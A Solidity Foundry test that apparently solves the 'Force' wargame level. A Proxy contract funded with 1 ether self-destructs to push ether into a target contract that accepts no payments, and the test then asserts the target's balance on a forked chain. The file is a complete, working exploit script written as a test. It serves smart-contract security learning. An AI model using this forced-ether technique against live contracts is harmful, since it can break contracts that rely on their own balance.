// SPDX-License-Identifier: UNLICENSED

// forge test --contracts src/test/Force.t.sol --fork-url $rpc -vvvv
pragma solidity ^0.6.0;

import "ds-test/test.sol";
import "forge-std/console.sol";
import "forge-std/Vm.sol";
import "../Force.sol";

contract Proxy {
    constructor() public payable {}
    function force_transfer(address addr) public {
        selfdestruct(payable(addr));
    }
}
contract ForceTest is DSTest {
    Force obj;
    Proxy proxy;
    Vm vm = Vm(HEVM_ADDRESS);
    address player_address;
    address contract_address;
    function setUp() public {    
        contract_address = 0x05A69873344a5d0bAbfAaf107dd44E2883813f64;
        player_address = 0xae22f26D5ddfE22d24aA28AEB1D44c962c673438;
        obj = Force(contract_address);
        proxy = new Proxy{value: 1 ether}();
    }

    function testForceTransferOfEther() public {
        vm.startPrank(player_address);
        console.log("Contract Address =", contract_address);
        console.log("Force initial balance =", contract_address.balance);
        // (bool success, ) = address(obj).call(abi.encodeWithSignature("pwn()"));
        // require(success, "Failed tx");
        proxy.force_transfer(address(obj));
        console.log("Force end balance =", contract_address.balance);
        assert(contract_address.balance >= 1 ether);
        vm.stopPrank();
    }
}
